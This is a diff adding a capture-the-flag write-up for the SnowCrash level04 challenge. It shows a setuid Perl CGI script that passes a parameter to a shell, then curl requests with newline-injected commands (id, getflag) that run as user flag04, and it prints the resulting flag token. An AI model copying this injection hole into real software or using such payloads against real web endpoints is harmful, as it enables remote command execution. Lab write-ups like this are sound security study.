@@ -1,0 +1,65 @@
+#we do ll
+level04@SnowCrash:~$ ll
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
+d--x--x--x  1 root    users    340 Aug 30  2015 ../
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile*
+
+#then identify the ower of executable
+level04@SnowCrash:~$ stat level04.pl 
+  File: level04.pl
+  Size: 152             Blocks: 8          IO Block: 4096   regular file
+Device: 10h/16d Inode: 11162       Links: 1
+Access: (6755/-rwsr-sr-x)  Uid: ( 3004/  flag04)   Gid: ( 2004/ level04)
+Access: 2016-03-05 19:23:32.000000000 +0100
+Modify: 2016-03-05 19:23:32.000000000 +0100
+Change: 2024-01-22 17:40:05.688274007 +0100
+ Birth: -
+
+#we will try to be user 3004 to run getflag
+
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+#This perl script uses the CGI module, with param, so we can pass parameters via CGI
+#The script takes the parameter and run it through the string echo and redirects error and std to std
+#We take the original URL and add a question mark followed by the parameter name, an equal sign, and the value desired.
+#We can use the browser from ssh machine with the url http://10.13.200.62:4747/level04.pl?x=%0Agetflag but we will use curl, the script says to use port 4747:
+#to get the html text we need a http method with -X option, we run id to see and use the url code for new line %0A
+#We check if 4747 is open or what
+level05@SnowCrash:~$ netstat -tunlp
+(No info could be read for "-p": geteuid()=2005 but you should be root.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::4646                 :::*                    LISTEN      -               
+tcp6       0      0 :::4747                 :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::4242                 :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -    
+
+#then proceed
+level04@SnowCrash:~$ curl -X GET "http://localhost:4747/level04.pl?x=%0Aid"
+
+uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
+
+#So we are user flag04, sweet
+#we run getflag
+level04@SnowCrash:~$ curl -X GET "http://localhost:4747/level04.pl?x=%0Agetflag"
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
+
